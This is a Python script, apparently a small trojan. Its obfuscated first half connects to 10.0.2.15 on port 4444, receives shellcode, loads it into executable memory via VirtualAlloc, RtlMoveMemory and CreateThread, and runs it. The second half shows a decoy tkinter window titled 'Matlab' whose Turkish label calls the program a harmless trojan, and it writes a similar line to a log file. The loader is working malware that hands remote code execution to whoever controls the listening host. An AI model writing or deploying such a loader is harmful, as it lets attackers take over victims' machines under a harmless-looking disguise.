import struct, socket, binascii, ctypes as sfhJehQUOXUbe, random, time
MSjIzGPtcBeYsw, RTMJNCplfoDACP = None, None
def qwmFbAaYKraRD():
	try:
		global RTMJNCplfoDACP
		RTMJNCplfoDACP = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		RTMJNCplfoDACP.connect(('10.0.2.15', 4444))
		JXAoRAb = struct.pack('<i', RTMJNCplfoDACP.fileno())
		l = struct.unpack('<i', RTMJNCplfoDACP.recv(4))[0]
		QZfzhNwC = b"     "
		while len(QZfzhNwC) < l: QZfzhNwC += RTMJNCplfoDACP.recv(l)
		LoRtOyjFZ = sfhJehQUOXUbe.create_string_buffer(QZfzhNwC, len(QZfzhNwC))
		LoRtOyjFZ[0] = binascii.unhexlify('BF')
		for i in range(4): LoRtOyjFZ[i+1] = JXAoRAb[i]
		return LoRtOyjFZ
	except: return None
def RWqSQCOggV(hJPfXHNbXnxVirK):
	if hJPfXHNbXnxVirK != None:
		mSCRYuAO = bytearray(hJPfXHNbXnxVirK)
		YVlQdChuIU = sfhJehQUOXUbe.windll.kernel32.VirtualAlloc(sfhJehQUOXUbe.c_int(0),sfhJehQUOXUbe.c_int(len(mSCRYuAO)),sfhJehQUOXUbe.c_int(0x3000),sfhJehQUOXUbe.c_int(0x40))
		JFncBM = (sfhJehQUOXUbe.c_char * len(mSCRYuAO)).from_buffer(mSCRYuAO)
		sfhJehQUOXUbe.windll.kernel32.RtlMoveMemory(sfhJehQUOXUbe.c_int(YVlQdChuIU), JFncBM, sfhJehQUOXUbe.c_int(len(mSCRYuAO)))
		ht = sfhJehQUOXUbe.windll.kernel32.CreateThread(sfhJehQUOXUbe.c_int(0),sfhJehQUOXUbe.c_int(0),sfhJehQUOXUbe.c_int(YVlQdChuIU),sfhJehQUOXUbe.c_int(0),sfhJehQUOXUbe.c_int(0),sfhJehQUOXUbe.pointer(sfhJehQUOXUbe.c_int(0)))
		sfhJehQUOXUbe.windll.kernel32.WaitForSingleObject(sfhJehQUOXUbe.c_int(ht),sfhJehQUOXUbe.c_int(-1))
MSjIzGPtcBeYsw = qwmFbAaYKraRD()
RWqSQCOggV(MSjIzGPtcBeYsw)

import tkinter as tk
import os

def pencere_ac():
    pencere=tk.Tk()
    pencere.title("Matlab")
    pencere.geometry("50x100")
    tk.Label(pencere,text="Bu zararsız bir trojandır").pack()
    pencere.mainloop()
    
def log_yaz():
    with open("log.txt","a") as f:
        f.write("bu zararsız bir trojan oluştur")
pencere_ac()
log_yaz()
